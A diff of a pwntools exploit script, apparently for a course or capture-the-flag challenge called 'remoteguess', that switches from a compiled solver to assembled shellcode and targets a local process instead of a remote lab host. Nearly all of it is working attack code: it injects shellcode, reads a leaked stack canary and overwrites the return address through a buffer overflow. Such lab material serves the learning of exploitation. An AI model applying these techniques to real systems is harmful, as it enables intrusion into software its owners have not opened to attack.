@@ -20,31 +20,41 @@ def solve_pow(r):
 
 context.arch = 'amd64'
 context.os = 'linux'
+exe = "./solver_asm.s"
+shellcode = None
+with open(exe,'r') as f:
+    shellcode = f.read()
+print(shellcode)
+payload = asm(shellcode)
+print(payload)
 
-exe = "./solver_sample" if len(sys.argv) < 2 else sys.argv[1];
-
-payload = None
-if os.path.exists(exe):
-    with open(exe, 'rb') as f:
-        payload = f.read()
-
-# r = process("./remoteguess", shell=True)
+r = process("./remoteguess", shell=True)
 # gdb.attach(r)
 # r = remote("localhost", 10816)
-r = remote("up23.zoolab.org", 10816)
+# r = remote("up23.zoolab.org", 10816)
 
 if type(r) != pwnlib.tubes.process.process:
     solve_pow(r)
 
-if payload != None:
-    ef = ELF(exe)
-    print("** {} bytes to submit, solver found at {:x}".format(len(payload), ef.symbols['solver']))
+if True:
     r.sendlineafter(b'send to me? ', str(len(payload)).encode())
-    r.sendlineafter(b'to call? ', str(ef.symbols['solver']).encode())
+    r.sendlineafter(b'to call? ', str(0).encode())
+    r.sendafter(b'bytes): ', payload)
+elif payload != None and False:
+#    ef = ELF(exe)
+    ef = elf
+    print("** {} bytes to submit, solver found at {:x}".format(len(payload), ef.symbols['solver']))
+#    r.sendlineafter(b'send to me? ', str(len(payload)).encode())
+    r.sendlineafter(b'send to me? ', str(0).encode())
+#    r.sendlineafter(b'to call? ', str(ef.symbols['solver']).encode())
+    r.sendlineafter(b'to call? ', str(0).encode())
     r.sendafter(b'bytes): ', payload)
 else:
     r.sendlineafter(b'send to me? ', b'0')
-
+"""
+r.interactive()
+exit(0)
+"""
 r.recvline()
 r.recvuntil(b': ')
 canary=r.recvlineS().strip()
@@ -62,9 +72,10 @@ guess=48763
 gen=str(guess).encode('ascii').ljust(0x18,b'\0')+p64(canary)+p64(rbp)+p64(ra)+p64(0)+p32(0)+p32(guess);
 # print(gen,len(gen))
 r.sendlineafter(b'answer? ',gen);
-for _ in range(3):
+for _ in range(2):
     line=r.recvline()
     print(line)
+
 
 
 # vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
